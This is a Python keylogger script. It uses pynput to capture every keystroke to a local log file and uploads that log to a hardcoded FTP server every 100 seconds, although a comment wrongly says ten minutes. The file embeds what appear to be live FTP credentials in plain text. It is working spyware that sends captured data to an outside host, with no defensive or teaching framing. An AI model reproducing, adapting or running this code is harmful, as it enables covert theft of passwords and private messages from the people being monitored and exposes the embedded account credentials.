import os
from pynput import keyboard
from ftplib import FTP
import time

# Determine log file location
log_file = os.getenv('pylogger_file', os.path.expanduser('~/Desktop/file.log'))

# Determine the cancel key (default is '`')
cancel_key = os.getenv('pylogger_cancel', '`')

# Remove the log file if 'pylogger_clean' environment variable is set
if os.getenv('pylogger_clean'):
    try:
        os.remove(log_file)
    except FileNotFoundError:
        pass

# FTP server details (Enter your FTP server details here)
FTP_HOST = "ftp.infinityfree.com"  # FTP server ka address
FTP_USER = "if0_37486755"   # FTP username
FTP_PASS = "ds5ruQJkW0"   # FTP password

# Function to upload log file to FTP server
def upload_log_to_ftp():
    try:
        ftp = FTP(FTP_HOST)
        ftp.login(FTP_USER, FTP_PASS)

        with open(log_file, 'rb') as file:
            ftp.storbinary(f"STOR {os.path.basename(log_file)}", file)

        ftp.quit()
        print("Log file successfully uploaded to FTP server")

        # Add timestamp to log file after successful upload
        with open(log_file, 'a') as log:
            log.write(f'Uploaded on: {time.ctime()}\n')  # Log upload time

    except Exception as e:
        print(f"Error uploading file to FTP server: {e}")
        with open(log_file, 'a') as log:
            log.write(f'Error: {e}\n')  # Log the error

# Function to handle key press events
def on_key_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f'{key}\n')

    except AttributeError:
        with open(log_file, 'a') as f:
            f.write(f'Special key pressed: {key}\n')

# Listener setup
try:
    with keyboard.Listener(on_press=on_key_press) as listener:
        # Periodically upload log file to FTP every 10 minutes (600 seconds)
        while listener.running:
            time.sleep(100)  # 100 is in seconds
            upload_log_to_ftp()

        listener.join()

except Exception as ex:
    with open(log_file, 'a') as f:
        f.write(f'Error: {ex}\n')  # Log errors
